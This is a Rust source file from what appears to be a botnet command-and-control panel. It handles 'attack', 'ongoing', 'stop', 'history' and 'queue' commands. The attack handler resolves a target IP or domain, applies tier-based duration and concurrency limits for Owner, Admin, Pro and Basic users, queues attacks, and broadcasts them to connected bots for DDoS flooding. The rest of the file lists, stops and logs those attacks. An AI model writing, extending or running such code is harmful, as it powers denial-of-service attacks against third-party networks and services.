use std::sync::Arc;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::{Result, AuditLog, log_audit_event};
use crate::modules::auth::Level;
use crate::modules::validation::{validate_port, validate_duration, check_ip_safety, validate_attack_method};
use super::ui::*;
pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 5 {
        client.write(b"\x1b[38;5;196m[X] Usage: attack <method> <target> <port> <duration>\n\r").await?;
        client.write(b"\x1b[38;5;245mExample: attack UDP 1.2.3.4 80 60\n\r").await?;
        return Ok(());
    }
    let method_str = match validate_attack_method(parts[1]) {
        Ok(m) => m,
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
            return Ok(());
        }
    };
    let target = parts[2].to_string();
    let port = match validate_port(parts[3]) {
        Ok(p) => p,
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
            return Ok(());
        }
    };
    let duration = match validate_duration(parts[4]) {
        Ok(d) => d,
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
            return Ok(());
        }
    };
    let (max_duration, _cooldown) = match client.user.get_level() {
        Level::Owner => (state.config.read().await.max_attack_duration_secs * 2, 10),
        Level::Admin => (state.config.read().await.max_attack_duration_secs, 5),
        Level::Pro => (state.config.read().await.max_attack_duration_secs, 3),
        Level::Basic => (state.config.read().await.max_attack_duration_secs / 2, 1),
    };
    if duration > max_duration {
        client.write(format!("\x1b[38;5;196m[X] Invalid duration (Max: {}s)\n\r", max_duration).as_bytes()).await?;
        return Ok(());
    }
    let concurrents = state.config.read().await.max_attacks;
    let active_attacks = state.attack_manager.get_user_attacks(&client.user.username).await.len();
    if active_attacks >= concurrents {
        client.write(format!("\x1b[38;5;196m[X] Max concurrent attacks reached ({}/{})\n\r", active_attacks, concurrents).as_bytes()).await?;
        return Ok(());
    }
    let ip = match target.parse::<std::net::IpAddr>() {
        Ok(ip) => ip,
        Err(_) => {
            match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
                Ok(mut addrs) => {
                    if let Some(addr) = addrs.next() {
                        addr.ip()
                    } else {
                        client.write(b"\x1b[38;5;196m[X] Could not resolve domain\n\r").await?;
                        return Ok(());
                    }
                }
                Err(_) => {
                    client.write(b"\x1b[38;5;196m[X] Invalid IP address or domain\n\r").await?;
                    return Ok(());
                }
            }
        }
    };
    if let Err(e) = check_ip_safety(ip) {
        client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
        return Ok(());
    }
    let resolved_target = ip.to_string();
    let display_target = if target == resolved_target {
        target.clone()
    } else {
        format!("{} [{}]", target, resolved_target)
    };
    let bot_count = state.bot_manager.get_bot_count().await;
    match state.attack_manager.start_attack(
        method_str.clone(),
        ip,
        port,
        duration,
        client.user.username.clone(),
        client.user.get_level(),
        bot_count
    ).await {
        Ok(attack_id) => {
            state.bot_manager.broadcast_attack(attack_id, &method_str, &resolved_target, port, duration).await;
            let audit_event = AuditLog::new(client.user.username.clone(), "START_ATTACK".to_string(), "SUCCESS".to_string())
                .with_target(format!("{}:{} (Method: {}, Duration: {}s, Bots: {})", display_target, port, method_str, duration, bot_count));
            let _ = log_audit_event(audit_event, &state.pool).await;
            client.write(format!("\x1b[38;5;82m[✓] Attack sent to {} bots\n\rID: {}\n\rTarget: {}:{}\n\rMethod: {}\n\rDuration: {}s\n\r", 
                bot_count, attack_id, display_target, port, method_str, duration).as_bytes()).await?;
        }
        Err(e) => {
            if e.contains("Maximum concurrent attacks reached") {
                match state.attack_manager.queue_attack(
                    method_str.clone(),
                    ip,
                    port,
                    duration,
                    client.user.username.clone(),
                    client.user.get_level(),
                    bot_count
                ).await {
                    Ok(pos) => {
                        client.write(format!("\x1b[38;5;226m[!] Max attacks reached. Added to queue (Position: {})\n\r", pos).as_bytes()).await?;
                        let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_ATTACK".to_string(), "SUCCESS".to_string())
                            .with_target(format!("{}:{} (Method: {}, Duration: {}s)", display_target, port, method_str, duration));
                        let _ = log_audit_event(audit_event, &state.pool).await;
                    }
                    Err(queue_err) => {
                        client.write(format!("\x1b[38;5;196m[X] Failed to start or queue attack: {}\n\r", queue_err).as_bytes()).await?;
                    }
                }
            } else {
                client.write(format!("\x1b[38;5;196m[X] Failed to start attack: {}\n\r", e).as_bytes()).await?;
            }
        }
    }
    Ok(())
}
pub async fn handle_ongoing_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let attacks = state.attack_manager.get_all_attacks().await;
    let title = apply_fire_gradient("Ongoing Attacks");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    if attacks.is_empty() {
        client.write(b"  \x1b[38;5;245mNo ongoing attacks\x1b[0m\n\r").await?;
    } else {
        for attack in attacks.iter() {
            let remaining = attack.remaining_duration().as_secs();
            if remaining == 0 { continue; }
            let method_str = &attack.method;
            let target_str = format!("{}:{}", attack.ip, attack.port);
            let id_gradient = apply_gradient(&attack.id.to_string(), 39, 45);
            let user_gradient = apply_gradient(&attack.username, 45, 51);
            let target_gradient = apply_gradient(&target_str, 51, 57);
            let method_gradient = apply_gradient(method_str, 57, 63);
            let time_gradient = apply_gradient(&format!("{}s", remaining), 63, 87);
            client.write(format!("  {} | {} | {} | {} | {}\n\r", 
                id_gradient, user_gradient, target_gradient, method_gradient, time_gradient).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > Ongoing Attacks").await;
    Ok(())
}
pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let attack_id_str = match parts.get(1) {
        Some(id) => id.to_string(),
        None => {
            let attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
            let mut count = 0;
            for attack in attacks {
                if state.attack_manager.stop_attack(attack.id as usize).await.is_ok() {
                    state.bot_manager.broadcast_stop(attack.id as usize).await;
                    count += 1;
                }
            }
            client.write(format!("\x1b[38;5;82m[✓] Stopped {} attacks\n\r", count).as_bytes()).await?;
            return Ok(());
        }
    };
    if let Ok(attack_id) = attack_id_str.parse::<usize>() {
        if let Some(attack) = state.attack_manager.get_attack(attack_id).await {
            if attack.username != client.user.username && !client.has_permission(Level::Admin) {
                 client.write(b"\x1b[38;5;196m[X] You do not own this attack\n\r").await?;
                 return Ok(());
            }
            if state.attack_manager.stop_attack(attack.id as usize).await.is_ok() {
                state.bot_manager.broadcast_stop(attack.id as usize).await;
                client.write(format!("\x1b[38;5;82m[✓] Attack {} stopped\n\r", attack_id).as_bytes()).await?;
                let audit_event = AuditLog::new(client.user.username.clone(), "STOP_ATTACK".to_string(), "SUCCESS".to_string())
                    .with_target(attack_id.to_string());
                let _ = log_audit_event(audit_event, &state.pool).await;
            } else {
                client.write(format!("\x1b[38;5;196m[X] Failed to stop attack {}\n\r", attack_id).as_bytes()).await?;
            }
        } else {
            client.write(format!("\x1b[38;5;196m[X] Attack {} not found\n\r", attack_id).as_bytes()).await?;
        }
    } else {
        client.write(b"\x1b[38;5;196m[X] Invalid attack ID\n\r").await?;
    }
    Ok(())
}
pub async fn handle_history_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let history = state.attack_manager.get_history(20).await;
    let title = apply_fire_gradient("Attack History");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    let user_history: Vec<_> = history.iter()
        .filter(|a| client.has_permission(Level::Admin) || a.username == client.user.username)
        .take(10)
        .collect();
    if user_history.is_empty() {
        client.write(b"  \x1b[38;5;245mNo attack history\x1b[0m\n\r").await?;
    } else {
        for attack in user_history.iter() {
            let method_str = &attack.method;
            let target_str = format!("{}:{}", attack.ip, attack.port);
            let time_str = &attack.started_at; 
            let user_gradient = apply_gradient(&attack.username, 39, 45);
            let target_gradient = apply_gradient(&target_str, 45, 51);
            let method_gradient = apply_gradient(method_str, 51, 57);
            let time_gradient = apply_gradient(&time_str[11..19], 57, 87); 
            client.write(format!("  {} | {} | {} | {}\n\r", 
                user_gradient, target_gradient, method_gradient, time_gradient).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    client.set_breadcrumb("Home > History").await;
    Ok(())
}
pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let queue_items = state.attack_manager.get_queue_items().await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let title = apply_fire_gradient("Attack Queue");
    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
    client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
    if queue_items.is_empty() {
        client.write(b"  \x1b[38;5;245mQueue is empty\x1b[0m\n\r").await?;
    } else {
        for (i, item) in queue_items.iter().enumerate() {
            let method_str = &item.method;
            let target_str = format!("{}:{}", item.ip, item.port);
            let user_str = &item.username;
            let pos_gradient = apply_gradient(&format!("#{}", i + 1), 39, 45);
            let user_gradient = apply_gradient(user_str, 45, 51);
            let target_gradient = apply_gradient(&target_str, 51, 57);
            let method_gradient = apply_gradient(method_str, 57, 63);
            let time_gradient = apply_gradient(&format!("{}s", item.duration_secs), 63, 87);
            client.write(format!("  {} | {} | {} | {} | {}\n\r", 
                pos_gradient, user_gradient, target_gradient, method_gradient, time_gradient).as_bytes()).await?;
        }
    }
    client.write(b"\n\r").await?;
    Ok(())
}
